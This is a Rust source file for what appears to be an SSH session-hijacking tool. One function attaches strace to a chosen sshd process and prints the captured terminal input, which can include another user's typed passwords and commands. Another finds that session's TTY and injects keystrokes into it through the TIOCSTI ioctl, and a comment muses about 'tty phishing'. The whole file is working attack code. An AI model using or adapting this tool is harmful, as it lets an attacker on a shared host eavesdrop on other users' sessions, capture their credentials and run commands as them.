use getch_rs::{enable_echo_input, Getch, Key};
use hex;
use nix::libc::{ioctl, TIOCSTI};
use regex::Regex;
use std::io::Write;
use std::io::{self, BufRead, BufReader};
use std::os::fd::AsRawFd;
use std::process::{Command, Stdio};

pub fn read(pid: &str) {
    println!("Attaching to {}", pid);

    let mut child = Command::new("strace")
        .args(["-xx", "-s", "16384", "-p", &pid, "-e", "read"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to start strace command");

    let stderr = child.stderr.take().expect("Failed to capture stderr");

    let mut reader = BufReader::new(stderr);
    let re = Regex::new(r#"(?mU)read\(8, "(.*)""#).unwrap();

    loop {
        let mut buf = String::new();
        let _ = reader.read_line(&mut buf);
        buf = buf.replace("\\x", "");

        if let Some(caps) = re.captures(&buf) {
            if let Some(mat) = caps.get(1) {
                let decoded_hex = hex::decode(mat.as_str()).expect("Failed to decode");
                io::stdout().write_all(&decoded_hex).expect("Pipe died");
                io::stdout().flush().unwrap();
            }
        }

        if let Ok(Some(_status)) = child.try_wait() {
            println!("Connection closed");
            break;
        }
    }
}

/// Given the pid of an sshd process, return the tty
/// This only works for sshd because they expose the tty in the cmdline
fn tty_of_sshd(pid: &str) -> Result<String, std::io::Error> {
    let cmdline = std::fs::read_to_string(format!("/proc/{pid}/cmdline"))?;

    // format: /path/to/sshd: user@tty
    let parts: Vec<&str> = cmdline.split('@').collect();

    println!("{:?}", parts);

    if parts.len() != 2 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Invalid cmdline",
        ));
    }

    // prepend /dev/ to tty, trim '\0' and return
    Ok(format!("/dev/{}", parts[1].trim_end_matches('\0')))
}
/// Takes a PID and writes to the stdin of the process
pub fn write(pid: &str) {
    let tty = &tty_of_sshd(pid).expect("Failed to get TTY");
    println!("Attaching writer to {}", tty);

    let input = Getch::new();

    loop {
        match input.getch() {
            Ok(Key::Ctrl('p')) => continue, // TODO: tty phishing?
            Ok(Key::Ctrl('z')) => break,
            Ok(Key::Ctrl('d')) => break,
            Ok(Key::Delete) => {
                // This is actually backspace but the crate we are using is cooked
                write_str(tty, "\x08\x1b\x5b\x4b");
            }
            Ok(Key::Char(c)) => {
                write_str(tty, &c.to_string());
            }
            _ => {}
        }
    }
}

fn write_char(tty: &str, c: u8) {
    let file = std::fs::OpenOptions::new()
        .write(true)
        .open(tty)
        .expect("Failed to open tty"); // TODO: Don't panic when connection closes.

    let fd = file.as_raw_fd();

    unsafe {
        ioctl(fd, TIOCSTI, &c as *const _ as *const i8);
    }
}

fn write_str(tty: &str, s: &str) {
    s.bytes().into_iter().for_each(|c| write_char(tty, c))
}
